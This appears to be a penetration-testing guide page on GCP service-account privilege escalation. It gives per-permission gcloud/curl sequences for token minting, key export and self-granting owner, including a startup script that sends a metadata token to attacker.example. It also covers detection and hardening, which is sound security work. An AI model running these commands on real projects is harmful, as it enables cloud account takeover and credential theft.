---
cstg_id: CSTG-GCP-SERVICE-ACCOUNTS-PRIVESC
title: "GCP Service Accounts - Privilege Escalation"
provider: gcp
service: service-accounts
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - iam.serviceAccounts.getAccessToken
  - iam.serviceAccounts.getOpenIdToken
  - iam.serviceAccounts.signJwt
  - iam.serviceAccounts.signBlob
  - iam.serviceAccounts.implicitDelegation
  - iam.serviceAccounts.actAs
  - iam.serviceAccountKeys.create
  - iam.serviceAccounts.setIamPolicy
  - iam.roles.update
  - resourcemanager.projects.setIamPolicy
tools:
  - gcloud CLI
  - Google Cloud IAM Credentials API
  - GCPLoot / gcp_enum style helpers
  - custom token-minting scripts
references:
  - "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
  - "https://cloud.google.com/iam/docs/reference/credentials/rest"
  - "https://cloud.google.com/iam/docs/service-account-permissions"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
  - "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/"
  - "https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation"
  - "https://hackingthe.cloud/gcp/exploitation/"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation in GCP almost always routes through service accounts. A principal who cannot directly perform a sensitive action can frequently *become* a service account that can — by minting a token for it, attaching it to a workload, creating a key for it, or rewriting IAM policy to grant itself more. The objective of this phase is to convert a limited foothold (a compromised user, a workload identity, or a single permission) into control of a higher-privileged service account and, ultimately, of the project, folder, or organization.

This page enumerates the discrete permissions that each enable an escalation path. Each `### <permission>` subsection is self-contained: it states what the permission grants, gives the concrete command sequence to abuse it, and identifies the resulting privilege gain. Many real-world chains combine two — for example `iam.serviceAccounts.actAs` plus a compute or function-create permission.

## Prerequisites

Assumed-breach: the tester controls at least one principal (user, federated identity, or workload service account) and has enumerated, per [Enumeration](../02-services/gcp-service-accounts-enum.md), the service accounts in scope and the principals that can act on them. For each candidate path below, confirm the controlled principal actually holds the named permission:

```bash
# Test self-permissions against a resource
gcloud iam service-accounts get-iam-policy TARGET_SA --format=json
gcloud projects get-iam-policy PROJECT --flatten="bindings[].members" \
  --filter="bindings.members:CURRENT_PRINCIPAL" \
  --format="table(bindings.role)"

# Or use testIamPermissions to probe without revealing the full policy
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT:testIamPermissions" \
  -d '{"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","resourcemanager.projects.setIamPolicy"]}'
```

## Enumeration

Build the candidate set from the impersonation graph produced in the Enumeration phase. The key questions:

- Which higher-privileged service accounts exist (holding `owner`/`editor`/`securityAdmin`/`projectIamAdmin`/`serviceAccountAdmin`)?
- For each, does the controlled principal hold any of: `getAccessToken`, `signJwt`, `signBlob`, `getOpenIdToken`, `implicitDelegation`, `actAs`, `serviceAccountKeys.create`, `setIamPolicy` (on the SA), or `iam.roles.update` (on a role the principal holds)?
- Are there project/org permissions the principal holds that allow editing IAM directly (`resourcemanager.projects.setIamPolicy`)?

```bash
TARGET=highpriv@PROJECT.iam.gserviceaccount.com
gcloud iam service-accounts get-iam-policy "$TARGET" --format=json \
  | jq '.bindings[] | select(.members[] | contains("CURRENT_PRINCIPAL"))'
```

## Misconfigurations & Findings

- A low-privilege principal holding `serviceAccountTokenCreator` (which grants `getAccessToken`/`signJwt`/`signBlob`) over a high-privilege SA.
- `serviceAccountUser` (`actAs`) plus any "create a workload" permission (`compute.instances.create`, `cloudfunctions.functions.create`, `run.services.create`, `dataflow.jobs.create`, `composer.environments.create`, etc.).
- `serviceAccountKeys.create` on a privileged SA, allowing export of long-lived credentials.
- `setIamPolicy` on a service account resource, allowing the principal to grant *itself* `serviceAccountTokenCreator`.
- `resourcemanager.projects.setIamPolicy` or `iam.roles.update` allowing direct self-grant of higher roles.
- The default Compute Engine SA with `roles/editor` attached to a workload the principal can reach.

## Exploitation

### iam.serviceAccounts.getAccessToken

Mint an OAuth2 access token *as the target SA* without any key. If the target holds higher roles, the token inherits them.

```bash
# Direct impersonation via the IAM Credentials API
gcloud auth print-access-token \
  --impersonate-service-account="$TARGET"

# Or one-shot a privileged command
gcloud projects get-iam-policy PROJECT \
  --impersonate-service-account="$TARGET"

# Raw API
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$TARGET:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
```

Result: full action under the target SA's roles. This is the canonical GCP escalation primitive.

### iam.serviceAccounts.signJwt

Sign an arbitrary JWT as the target SA, then exchange it for an access token at Google's OAuth2 token endpoint — equivalent to `getAccessToken` but useful where the access-token endpoint is restricted or where a self-signed assertion is needed.

```bash
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$TARGET:signJwt" \
  -d '{"payload":"{\"iss\":\"'$TARGET'\",\"sub\":\"'$TARGET'\",\"aud\":\"https://oauth2.googleapis.com/token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"iat\":TS,\"exp\":TS3600}"}'
# POST the returned signedJwt as grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer to https://oauth2.googleapis.com/token
```

Result: access token as the target SA.

### iam.serviceAccounts.signBlob

Sign arbitrary bytes as the SA. This permits forging signed URLs and JWTs (the building block of `signJwt`) and signing GCS V4 signed URLs that grant data access. Combined with knowledge of the SA's privileges, it yields token-equivalent access.

```bash
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$TARGET:signBlob" \
  -d '{"payload":"<base64-bytes-of-a-jwt-or-url-to-sign>"}'
```

Result: forge a JWT assertion / signed URL, exchange for a token, escalate.

### iam.serviceAccounts.getOpenIdToken

Mint an OIDC ID token as the SA. Where downstream services (Cloud Run, IAP-protected apps, third-party OIDC trust) authenticate via ID token, this grants entry as the SA.

```bash
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$TARGET:generateIdToken" \
  -d '{"audience":"https://target-service.example","includeEmail":true}'
```

### iam.serviceAccounts.implicitDelegation

Allows the controlled SA to use a *delegation chain* to a final target SA, generating a token for the target even when no direct `getAccessToken` grant exists, provided each hop permits delegation.

```bash
gcloud auth print-access-token \
  --impersonate-service-account="$TARGET" \
  --delegates="intermediate@PROJECT.iam.gserviceaccount.com"
# REST: pass "delegates":["projects/-/serviceAccounts/intermediate@..."] in generateAccessToken
```

Result: reach a high-privilege SA through an intermediate, even when the first SA cannot impersonate the target directly.

### iam.serviceAccounts.actAs

By itself this does nothing, but combined with a resource-create permission it lets the principal launch a workload *running as* the target SA and then execute code under that identity.

```bash
# Via a new Compute Engine VM with a startup script that exfils a token
gcloud compute instances create privesc-vm \
  --service-account="$TARGET" \
  --scopes="https://www.googleapis.com/auth/cloud-platform" \
  --metadata=startup-script='#! /bin/bash
    TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
    curl -s -X POST https://attacker.example/c -d "$TOKEN"'

# Or via a Cloud Function / Cloud Run job that runs as the target SA
gcloud functions deploy privesc-fn --runtime=python311 \
  --service-account="$TARGET" --trigger-http --allow-unauthenticated \
  --entry-point=handler --source=.
```

Result: arbitrary code execution as the target SA — the most common real-world escalation, exploiting the default SA's `roles/editor`.

### iam.serviceAccountKeys.create

Create and download a long-lived JSON key for the target SA, then activate it. Yields durable, session-independent access.

```bash
gcloud iam service-accounts keys create /tmp/priv.json --iam-account="$TARGET"
gcloud auth activate-service-account --key-file=/tmp/priv.json
gcloud projects get-iam-policy PROJECT   # now acting as TARGET
```

Result: persistent credential for the higher-privileged SA (see also [Persistence](../06-persistence/gcp-service-accounts-persistence.md)).

### iam.serviceAccounts.setIamPolicy

Edit the IAM policy *on the SA resource* to grant the controlled principal `serviceAccountTokenCreator`, then escalate via `getAccessToken`.

```bash
gcloud iam service-accounts add-iam-policy-binding "$TARGET" \
  --member="user:attacker@example.com" \
  --role="roles/iam.serviceAccountTokenCreator"
gcloud auth print-access-token --impersonate-service-account="$TARGET"
```

### resourcemanager.projects.setIamPolicy

Direct project-level escalation: bind a higher role to the controlled principal (or grant impersonation over a privileged SA).

```bash
gcloud projects add-iam-policy-binding PROJECT \
  --member="user:attacker@example.com" \
  --role="roles/owner"
```

Result: immediate project owner. The same applies to `folders.setIamPolicy` and `organizations.setIamPolicy` at higher scopes.

### iam.roles.update

If the principal holds a custom role, it can add powerful permissions to that role's definition, escalating without touching any binding.

```bash
gcloud iam roles update CUSTOM_ROLE --project=PROJECT \
  --add-permissions=resourcemanager.projects.setIamPolicy,iam.serviceAccounts.getAccessToken
```

## Detection & Logging

- **Cloud Audit Logs — Data Access** for the IAM Credentials API record `GenerateAccessToken`, `GenerateIdToken`, `SignJwt`, and `SignBlob` calls (service `iamcredentials.googleapis.com`). These are *not* logged unless Data Access logging is enabled for that API — enabling it is the single most valuable detection control for SA abuse. The log entry shows the *caller* principal and the *target* SA, exposing impersonation edges.
- **Admin Activity logs** always record `CreateServiceAccountKey`, `SetIamPolicy` (project/SA/role), `UpdateRole`, and `compute.instances.insert` / `cloudfunctions.functions.create` with the attached SA — these are reliable signals for the key-creation, policy-edit, and actAs paths.
- Alert on: a principal granting itself a role; new `serviceAccountTokenCreator` bindings; user-managed key creation on privileged SAs; new workloads launched with a default or high-privilege SA; custom-role permission additions.
- Security Command Center / Event Threat Detection flags self-investigation, anomalous impersonation, and IAM abuse patterns.

## Remediation & Hardening

- Enable Data Access audit logging for `iamcredentials.googleapis.com` and `iam.googleapis.com` so impersonation and signing are observable.
- Grant `serviceAccountTokenCreator`, `serviceAccountUser`, and `serviceAccountKeyAdmin` sparingly, scoped to individual service accounts, never project-wide, and never to broad groups or `allUsers`.
- Enforce `iam.disableServiceAccountKeyCreation` to remove the key-creation path; rely on short-lived impersonation instead.
- Disable automatic `roles/editor` for default SAs (`iam.automaticIamGrantsForDefaultServiceAccounts`) and attach least-privilege SAs to workloads.
- Separate duties: principals that can edit IAM policy (`setIamPolicy`, `roles.update`) should be tightly controlled and monitored; avoid granting `resourcemanager.projects.setIamPolicy` outside of admins.
- Use IAM Conditions and deny policies to constrain impersonation by resource, time, and context.

## Tools

- **gcloud CLI** — `--impersonate-service-account`, `iam service-accounts keys create`, `add-iam-policy-binding`.
- **Google Cloud IAM Credentials API** (`iamcredentials.googleapis.com`) — `generateAccessToken`, `generateIdToken`, `signJwt`, `signBlob`.
- **GCP IAM privilege-escalation reference scripts** — automate testing of the permission-to-path mappings above.

## References

- Create short-lived credentials (direct impersonation) — https://cloud.google.com/iam/docs/create-short-lived-credentials-direct
- IAM Credentials API reference — https://cloud.google.com/iam/docs/reference/credentials/rest
- Service account permissions (actAs, token creator) — https://cloud.google.com/iam/docs/service-account-permissions
- GCP privilege escalation, part 1 (Rhino Security Labs) — https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- GCP privilege escalation, part 2 (Rhino Security Labs) — https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
- GCP-IAM-Privilege-Escalation methods (Rhino Security Labs) — https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
- GCP exploitation techniques (hackingthe.cloud) — https://hackingthe.cloud/gcp/exploitation/
